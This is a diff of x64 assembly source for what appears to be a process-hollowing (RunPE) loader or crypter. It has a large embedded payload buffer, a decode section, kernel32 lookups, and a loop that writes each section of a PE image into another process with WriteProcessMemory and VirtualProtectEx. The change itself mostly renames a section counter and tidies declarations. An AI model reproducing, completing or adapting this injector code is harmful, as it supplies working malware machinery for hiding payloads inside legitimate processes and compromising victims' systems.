@@ -154,40 +154,29 @@ section .data
     TamArqTarget times 8                             dq 0
     bufferFileName times 32                          db 0
     Buffer times 800000                              dq 0
-    addressAlocado times 8                           dq 0
-    addressAlocadoEx times 8                         dq 0
-    handle times 8                                   dq 0
     entrypointTarget times 8                         dq 0
     GetSizeTarget times 8                            dq 0
     lpPebImageBase times 8                           dq 0
-    openProcessH times 8                             dq 0
-    lpContext times 8                                dd 0 
     allocex times 8                                  dd 0 
     alloc times 8                                    dd 0
     lpImageBase times 8                              dd 0
     VA times 8                                       dd 0
-    lpAllocatedBaset times 8                         dd 0
     PE times 8                                       dq 0
     ImageBase times 16                               dq 0
-    Secion times 8                                   dq 0
     NumSecion times 8                                db 0
     Ptrt times 8                                     dq 0
-    RS times 8                                       dq 0
-    RW times 8                                       dq 0
-    Thread times 8                                   dq 0
     void times 8                                     dq 0
-    alloex2 times 8                                  dq 0
-    vUnk times 8                                     dq 0
-    zero times 8                                     dq 0
+    NumSection times 8                               dq 0
     address750 times 8                               dq 0
-	pt20 dq 20
-    Ptrt0 dq 0x00
-	ptr17f0 dd 0x01
-	address7ec dd 0
-	Ptrl dq  0x0004000000000000
+    pt20                                             dq 20
+    Ptrt0                                            dq 0x00
+    ptr17f0                                          dd 0x01
+    address7ec                                       dd 0
+    Ptrl                                             dq  0x0004000000000000
+
 section .codered
-	CodeRed:
-	Buffer2 times 800000                         db 0
+	CodeRed times 800000                         db 0:
+	
 	
 section .deccode
 	decCode:
@@ -528,14 +517,14 @@ section .deccode
 			add rax,Rdx
 			add rax, 0x108
 			mov [address750], rax
-			mov [zero], dword 0x00
+			mov [NumSection], dword 0x00
 			jmp Final
 		
 		Delta:
 			call Locate_kernel32
 			;Lookup WriteProcess
 			call WriteProcess
-			mov eax,[zero]
+			mov eax,[NumSection]
 			movsxd rdx,eax
 			mov rax, RDX
 			shl rax,0x2
@@ -546,7 +535,7 @@ section .deccode
 			add rax, Rdx
 			mov eax, dword[rax+0x10]
 			mov r9d,eax
-			mov eax, dword [zero]
+			mov eax, dword [NumSection]
 			movsxd rdx,eax
 			mov rax,Rdx
 			shl rax,0x2
@@ -560,7 +549,7 @@ section .deccode
 			mov rax, [lpImageBase]
 			add rax,Rdx
 			mov r8, Rax
-			mov eax, dword[zero]
+			mov eax, dword[NumSection]
 			movsxd rdx, eax
 			mov rax, Rdx
 			shl rax, 0x2
@@ -585,12 +574,12 @@ section .deccode
 			movzx eax, word[rax+0x6]
 			movzx eax, ax
 			sub eax, 0x01
-			cmp eax, [zero]
+			cmp eax, [NumSection]
 			
 			jne Decisao2
 			mov rax, [PE]
 			mov ecx, [rax+0x50]
-			mov eax, dword[zero]
+			mov eax, dword[NumSection]
 			movsxd rdx,eax
 			mov rax,rdx
 			shl rax, 0x02
@@ -602,10 +591,10 @@ section .deccode
 			mov eax, dword [rax+0xc]
 			sub ecx,eax
 			mov eax,ecx
-			mov dword[zero], eax
+			mov dword[NumSection], eax
 			jmp D4
 		Decisao2:
-			mov eax, dword[zero]
+			mov eax, dword[NumSection]
 			cdqe
 			lea rdx, [rax+1]
 			mov rax,Rdx
@@ -614,7 +603,7 @@ section .deccode
 			mov rax, [address750]
 			add rax,Rdx
 			mov ecx, dword [rax+0xC]
-			mov eax, dword[zero]
+			mov eax, dword[NumSection]
 			movsxd rdx,eax
 			mov rax,Rdx
 			shl rax, 0x02
@@ -630,7 +619,7 @@ section .deccode
 			
 		D4:
 			mov dword[address7ec], 0
-			mov eax, dword[zero]
+			mov eax, dword[NumSection]
 			movsxd rdx,eax
 			mov rax,Rdx
 			shl rax, 0x02
@@ -644,7 +633,7 @@ section .deccode
 			test eax, eax 
 			je D5
 			
-			mov eax, [zero]
+			mov eax, [NumSection]
 			movsxd rdx,eax
 			mov rax,Rdx
 			shl rax,0x02
@@ -658,7 +647,7 @@ section .deccode
 			test eax,eax
 			je D5
 			
-			mov eax, dword[zero]
+			mov eax, dword[NumSection]
 			movsxd rdx,eax
 			mov rax,Rdx
 			shl rax, 0x02
@@ -673,7 +662,7 @@ section .deccode
 			mov dword[address7ec],0x40
 			jmp jmpAlloc
 		D5:
-			mov eax, dword[zero]
+			mov eax, dword[NumSection]
 			movsxd rdx,eax
 			mov rax,Rdx
 			shl rax, 0x02
@@ -687,7 +676,7 @@ section .deccode
 			test eax,eax
 			
 			je D6
-			mov eax, dword[zero]
+			mov eax, dword[NumSection]
 			movsxd rdx,eax
 			mov rax,Rdx
 			shl rax, 0x02
@@ -712,7 +701,7 @@ section .deccode
 		;Lookup VirtualProectEx
 		call VirtualProectEx
 		mov ecx, dword[ptr17f0]
-		mov eax, dword[zero]
+		mov eax, dword[NumSection]
 		movsxd rdx,eax
 		mov rax,Rdx
 		shl rax, 0x2
@@ -736,13 +725,13 @@ section .deccode
 		mov rdx,r10
 		mov rcx, Rax
 		call r12
-		add dword [zero], 0x1
+		add dword [NumSection], 0x1
 		
 	Final:
 		mov rax, [PE]
 		movzx eax, word[rax+0x06]
 		movzx eax, ax
-		cmp eax, [zero]	
+		cmp eax, [NumSection]	
 		jg Delta
 			
 		call Locate_kernel32 
